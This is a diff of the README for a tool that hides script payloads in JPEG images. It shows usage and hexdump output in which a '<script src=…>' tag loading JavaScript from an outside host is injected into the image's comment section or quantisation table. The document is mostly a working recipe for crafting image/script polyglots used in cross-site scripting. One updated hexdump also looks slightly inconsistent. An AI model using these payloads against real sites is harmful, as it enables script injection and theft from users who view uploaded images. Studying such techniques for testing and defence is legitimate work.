@@ -160,56 +160,73 @@ payload.gif: GIF image data, version 87a, 10799 x 32
 00000064
 ```
 
-### jpg.pl
+### pixload-jpg
 
-JPG Payload Creator/Injector.
-
-Create a minimal JPG Image with custom/default payload, or inject
-payload into existing image.
-
-There are two ways for injecting:
-
-  - inject into COMMENT section
-
-  - inject into DQT table
-
-##### Usage
+##### Help
 
 ```sh
-./jpg.pl -place COM|DQT [-payload 'STRING'] -output payload.jpg
-
--place COM:
-  The payload will be injected as a 'COMMENT'.
-
-  If the output file exists, then the payload will be injected into the
-  existing file.  Else the new one will be created.
-
--place DQT:
-  The payload will be injected into 'DQT table'.
-
-  LIMITATION:
-    1. payload size must not exceed 64 bytes.
-    2. no injection support, only new file generation.
-
-  This is necessary in case the server application processes images and
-  removes comments, application-specific data, etc.
-
-  The data in DQT table must remain intact.
-
-  ! If the output file exists, then it will be rewritten. !
+$ pixload-jpg --help
 ```
 
-##### Example
+```
+Usage: pixload-jpg [OPTION]... FILE
+Hide Payload/Malicious Code in JPEG images.
 
-* DQT
+Mandatory arguments to long options are mandatory for short options too.
+  -S, --section COM|DQT         set section for payload injection
+  -P, --payload STRING          set payload for injection
+  -v, --version                 print version and exit
+  -h, --help                    print help and exit
+
+If the output FILE already exists, then payload will be injected into this
+existing file. Otherwise, the new one will be created.
+```
+
+##### Examples
+
+1. Inject payload into comment section:
 
 ```sh
-./jpg.pl -place DQT -output payload.jpg
+$ pixload-jpg -S com payload.jpg
+```
 
-[>|      JPEG Payload Creator/Injector      |<]
+```
+........ JPEG Payload Creator/Injector ........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
 
-    https://github.com/chinarulezzz/pixload
+[>] Generating output file
+[✔] File saved to: payload.jpg
 
+[>] Injecting payload into COMMENT
+[✔] Payload was injected successfully
+
+payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
+
+00000000  ff d8 ff fe 00 25 3c 73  63 72 69 70 74 20 73 72  |.....%<script sr|
+00000010  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
+00000020  3c 2f 73 63 72 69 70 74  3e ff db 00 43 00 01 01  |</script>...C...|
+00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
+*
+00000060  01 01 01 01 01 01 01 01  01 01 01 01 01 01 ff c2  |................|
+00000070  00 0b 08 00 01 00 01 01  01 11 00 ff c4 00 14 00  |................|
+00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|
+0000009e
+```
+
+2. Inject payload into DQT table:
+
+```sh
+$ pixload-jpg -S dqt payload.jpg
+```
+
+```
+........ JPEG Payload Creator/Injector ........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
 
 [>] Generating output file
 [✔] File saved to: payload.jpg
@@ -221,42 +238,19 @@ payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
 
 00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|
 00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
-00000020  01 01 01 01 01 01 01 01  3c 73 63 72 69 70 74 20  |........<script |
-00000030  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
+00000020  01 01 01 01 3c 73 63 72  69 70 74 20 73 72 63 3d  |....<script src=|
+00000030  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com></|
 00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script>.........|
 00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|
 00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|
-00000070  00 00 00 01 3f ff d9                              |....?..|
-00000077
+00000070  00 00 00 01 3f ff d9 01  01 11 00 ff c4 00 14 00  |....?...........|
+00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|
+0000009e
 ```
 
-* COMMENT
-
-```sh
-./jpg.pl -place COM -output payload.jpg
-
-[>|      JPEG Payload Creator/Injector      |<]
-
-    https://github.com/chinarulezzz/pixload
-
-
-[>] Injecting payload into COMMENT
-[✔] Payload was injected successfully
-
-payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
-
-00000000  ff d8 ff fe 00 21 3c 73  63 72 69 70 74 20 73 72  |.....!<script sr|
-00000010  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
-00000020  72 69 70 74 3e ff db 00  43 00 01 01 01 01 01 01  |ript>...C.......|
-00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
-00000040  01 01 01 01 01 01 01 01  01 01 01 3c 73 63 72 69  |...........<scri|
-00000050  70 74 20 73 72 63 3d 2f  2f 6e 6a 69 2e 78 79 7a  |pt src=//nji.xyz|
-00000060  3e 3c 2f 73 63 72 69 70  74 3e ff c2 00 0b 08 00  |></script>......|
-00000070  01 00 01 01 01 11 00 ff  c4 00 14 00 01 00 00 00  |................|
-00000080  00 00 00 00 00 00 00 00  00 00 00 00 03 ff da 00  |................|
-00000090  08 01 01 00 00 00 01 3f  ff d9                    |.......?..|
-0000009a
-```
+See [pixload-jpg(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-jpg.1.pod)
+for more information.
 
 ### pixload-png
 
